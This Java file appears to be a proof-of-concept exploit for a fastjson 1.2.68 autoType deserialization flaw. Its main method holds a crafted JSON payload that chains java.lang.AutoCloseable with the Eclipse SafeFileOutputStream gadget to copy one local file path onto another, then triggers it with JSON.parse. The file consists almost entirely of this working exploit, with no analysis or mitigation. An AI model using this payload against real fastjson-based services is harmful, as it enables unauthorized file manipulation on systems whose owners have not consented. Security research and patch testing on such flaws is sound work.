package com.firebasky.fastjson.poc1268;

import com.alibaba.fastjson.JSON;

public class copy {
    public static void main(String[] args) {
        String copy ="{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"d:/flag.txt\", \"targetPath\":\"D:/win.txt\"}";
        Object parse = JSON.parse(copy);
        System.out.println(parse);
    }
}
